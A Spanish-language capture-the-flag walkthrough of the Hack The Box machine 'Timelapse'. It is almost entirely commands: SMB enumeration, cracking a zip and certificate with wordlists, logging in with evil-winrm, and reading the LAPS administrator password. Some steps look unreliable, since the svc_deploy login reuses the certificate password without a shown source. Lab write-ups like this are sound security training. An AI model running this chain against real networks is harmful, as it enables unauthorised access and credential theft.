# Walkthrough para la Máquina "Timelapse" en Hack The Box

Este es un paso a paso detallado de cómo comprometí la máquina Timelapse en Hack The Box. Los recursos utilizados se mencionan al principio del walkthrough.

## Escaneo Inicial

- **Nmap:**
  ```
  nmap -p- -sC -sV -oN nmap_scan.txt 10.10.11.152
  ```

- **Enumeración SMB:**
  ```
  smbclient -N -L \\\\10.10.11.152
  smbclient \\\\10.10.11.152\\Shares
  ```

  Resultado: Se identificó un archivo zip accesible para todos llamado `winrm_backup.zip`.

## Descifrado de Archivo Zip

- **Descifrado con fcrackzip:**
  ```
  fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
  ```

  Resultado: La contraseña encontrada fue `supremelegacy`.

- **Extracción de Archivo Zip:**
  ```
  sudo unzip winrm_backup.zip
  ```

## Conversión de Certificado PFX

- **Conversión y Obtención de Hash:**
  ```
  pfx2john legacyy_dev_auth.pfx > pfx_timelapse.hash
  john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash --rule /usr/share/john/rules/rockyou-30000.rule
  ```

  Resultado: La contraseña encontrada fue `thuglegacy`.

- **Conversión a Archivos PEM:**
  ```
  openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
  openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
  ```

- **Copiar Contenido a Nuevos Archivos:**
  ```
  cp priv-key.pem legacy.key
  cp certificate.pem legacy.cert
  ```

## Acceso Inicial a la Máquina

- **Utilizando evil-winrm:**
  ```
  evil-winrm -S -k legacy.key -c legacy.cert -i 10.10.11.152
  ```

  Resultado: Se obtuvo el archivo `user.txt`.

## Escalada de Privilegios

- **Enumeración y Escalada:**
  ```
  PS: net user legacyy
  PS: whoami /user
  PS: whoami /priv
  ```

- **Análisis de PowerShell History File:**
  ```
  PS: echo $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
  PS: cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\
  PS: cat ConsoleHost_history.txt
  ```

- **Ejecución de Comandos en PowerShell Remotamente:**
  ```
  PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
  get-aduser -filter * -properties *
  ```

  Resultado: Se obtuvo información sobre el usuario `svc_deploy`.

## Acceso con Credenciales Privilegiadas

- **Conexión con evil-winrm como `svc_deploy`:**
  ```
  evil-winrm -u 'svc_deploy' -p 'thuglegacy' -i 10.10.11.152
  ```

- **Obtención de Información de Usuario con `Get-ADUser`:**
  ```
  PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
  ```

  Resultado: `svc_deploy` es miembro del grupo `LAPS_Readers`.

## Extracción de Contraseña Administrativa

- **Extracción de Contraseña de Administrador:**
  ```
  PS: invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}
  ```

  Resultado: Contraseña de Administrador obtenida (`b}1;qx7&tr}yW!5X(6b,ir&6`).

## Acceso como Administrador

- **Conexión con evil-winrm como `Administrator`:**
  ```
  evil-winrm -u 'Administrator' -p 'b}1;qx7&tr}yW!5X(6b,ir&6' -i 10.10.11.152 -S
  ```

  Resultado: Acceso como `Administrator` y obtención del archivo `root.txt`.

Este walkthrough proporciona una descripción estructurada de cómo comprometí la máquina Timelapse en Hack The Box. ¡Espero que sea útil para mejorar tus habilidades en ciberseguridad!